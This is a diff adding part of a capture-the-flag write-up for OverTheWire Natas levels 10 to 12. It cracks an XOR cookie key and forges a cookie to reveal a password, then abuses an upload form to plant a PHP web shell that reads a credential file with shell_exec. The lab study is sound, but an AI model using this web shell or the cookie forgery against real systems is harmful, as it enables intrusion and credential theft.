@@ -431,3 +431,317 @@ This page welcomes the user with a message saying that cookies are protected wit
 - Inspect resources.
 - Understand the meaning of the message.
 - Get the password.
+
+### Testing form 10
+
+It looks like the relevant information is the only cookie being stored. Here are some tests:
+
+|  Color  |                           Cookie                           |
+| :-----: | :--------------------------------------------------------: |
+| #ffffff | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D |
+| #111111 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GdWZeVHVmTRg%3D |
+| #AAAAAA | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GBRYuJAUWTRg%3D |
+| #D1AB59 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GAGYuJ3FuTRg%3D |
+
+The majority of the cookie stays the same, it looks like the color only affects this part:
+
+```text
+HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1G[_-_-_-]TRg%3D
+```
+
+### Inspection 10
+
+This time the php code available in the view source link provided has a fair amount of lines. The logic can be divided into the following actions:
+
+```php
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+$data = loadData($defaultdata);
+saveData($data);
+
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+```
+
+#### Loading the data
+
+The loading of the data takes place in the following function:
+
+```php
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+```
+
+**TLDR**:
+
+1. There has to be a cookie named `data`.
+2. It takes the value of the cookie, decodes it with base64, encrypts it with `xor_encrypt()` and decodes it with json.
+3. If the result of the previous step is an array with keys `bgcolor` and `showpassword`, checks if the color is valid. If it is, then sets the real values of `bgcolor` and `showpassword` into those.
+
+#### xor encryption
+
+Here is the definition:
+
+```php
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+```
+
+#### Saving the data
+
+The saving of the data follows this logic:
+
+```php
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+```
+
+### Cracking the encryption
+
+#### Getting the key
+
+The first thing to achieve is getting the value of the key. To do this, user should first focus on this particular line of code from the `saveDate()` function:
+
+```php
+base64_encode(xor_encrypt(json_encode($d)))
+```
+
+User can separate the whole process into two sides that will eventually converge. See it like this:
+
+```text
+Cookie ==> base64_encode ==> xor_encrypt <== json_encode <== array(...)
+```
+
+Lets put an example. Consider the following scenario:
+
+```php
+$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
+$arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
+```
+
+After applying the corresponding transformation for each one:
+
+```php
+$json_encode = '{"showpassword":"no","bgcolor":"#ffffff"}';
+$base64_decode = "something non human readable";
+```
+
+Here the user has to stop and think about the xor operation. Following this example, making XOR between `{` and `$key[0]` will result in `s`:
+
+- `'"' ^ $key[1] = 'o'`
+- `'s' ^ $key[2] = 'm'`
+- And so on.
+
+Considering that the XOR transformation applied twice returns the original (in other words, the opposite of the operation is just applying it again). User can algebraically manipulate the previous operation into getting the value of a particular index of `$key`. Like this:
+
+- `$key[0] = '{' ^ 's'`
+- `$key[1] = '"' ^ 'o'`
+
+With this information, user can create a quick PHP script that cracks the key:
+
+```php
+<?php
+
+$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
+$arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
+
+$json_encode = json_encode($arr);
+$base64_decode = base64_decode($cookie);
+
+for ($i = 0; $i < strlen($json_encode); $i++) {
+    echo $json_encode[$i] ^ $base64_decode[$i];
+}
+```
+
+The output will be:
+
+```text
+eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
+```
+
+Considering the repetitions, the key should be `eDWo`. A quick way to check it:
+
+```php
+function testKey(): bool {
+    $cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
+    $arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
+    $json_encode = json_encode($arr);
+    $base64_decode = base64_decode($cookie);
+
+    return xor_encrypt($base64_decode) === $json_encode; // <==
+}
+
+function xor_encrypt($in) {
+    $key = 'eDWo'; // <==
+    $text = $in;
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+var_dump(testKey());
+```
+
+### Getting the correct cookie
+
+With the key, the user can now easily traverse the `loadData()` process backwards in order to get the correct cookie.
+
+1. Creating the array that will end up showing the password.
+2. Encode with json.
+3. Encrypt with XOR.
+4. Encode with base64.
+
+```php
+$arr = array("showpassword"=>"yes","bgcolor"=>"#ffffff");
+$json = json_encode($arr);
+$xor = xor_encrypt($json);
+$cookie = base64_encode($xor);
+
+echo $cookie;
+```
+
+With the cookie the user can make use of it either with Burp Suite or with devtools and grab the password.
+
+## Level 11 ➡ Level 12
+
+This time the user is welcomed with the instructions of uploading a `.jpeg` of up to 1KB. The page provides two buttons: one for browsing the filesystem and other for uploading the file.
+
+- Test the uploader.
+- Inspect the resources.
+- Find what needs to be done.
+- Get the password.
+
+### Testing the uploader
+
+- Not uploading anything shows an error.
+- Uploading any file changes its name and forces its extension to `.jpg`.
+- The uploaded file can be seen following the provided link. The resource is at `/upload/new_name.jpg`.
+
+### Inspection 11
+
+#### HTML inspection 11
+
+The html inspection shows two odd lines with `type="hidden`:
+
+```html
+<input type="hidden" name="MAX_FILE_SIZE" value="1000">
+<input type="hidden" name="filename" value="8cu5lximjb.jpg">
+```
+
+The `.jpg` changes each time the user refreshes the page.
+
+#### PHP inspection 11
+
+The PHP inspection shows, as usual, a fair amount of functions. The flow of execution looks something like:
+
+1. Checks if superglobal `$_POST` contains the key `filename`.
+2. If does not contain that key, it randomly generates a filename with extension `.jpg` as seen previously.
+3. If it contains that key, randomly generates a path using multiple functions. It ends up looking like `upload/random_string.filename_ext`.
+4. If file isn't too big and passes `move_uploaded_file()` the file gets uploaded.
+
+### Random path creation logic
+
+The path creation uses 3 functions:
+
+#### `genRandomString`
+
+```php
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+```
+
+Thoughts:
+
+- Generates a string of length 10, using lowercase letters and numbers.
+
+#### `makeRandomPath`
+
+```php
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+```
+
+Thoughts:
+
+- Given a directory and a file extension, generates a path that follows this format: `$dir/random_string.$ext`.
+- Does that until file does not exist already.
+
+#### `makeRandomPathFromFilename`
+
+```php
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+```
+
+Thoughts:
+
+- The file given as parameter is only used for its extension. The function `pathinfo` with the option `PATHINFO_EXTENSION` ignores everything except the extension.
+- Returns a path that follows this format: `$dir/random_string.$ext`.
+
+### Resolution 11
+
+Taking into consideration that no matter what file the user uploads it always ends up being a `.jpg`, and remembering that the only place this is defined is in the html, the user can try manipulating this resource on the frontend to see what happens.
+
+```html
+<input type="hidden" name="filename" value="t2sgjbtabr.php">
+```
+
+After submitting the user gets a message that says:
+
+> The file `upload/96omfk74zs.php` has been uploaded.
+
+And following the link opens the file and interpretes the php code inside. With this information, the user can write the following:
+
+```php
+<?
+
+$out = shell_exec('cat /etc/natas_webpass/natas13');
+echo "<pre>$out</pre>";
+```
+
+Thoughts:
+
+- `$out`: gets the result of running the shell command.
+- `echo ...`: makes it visible on the web page.
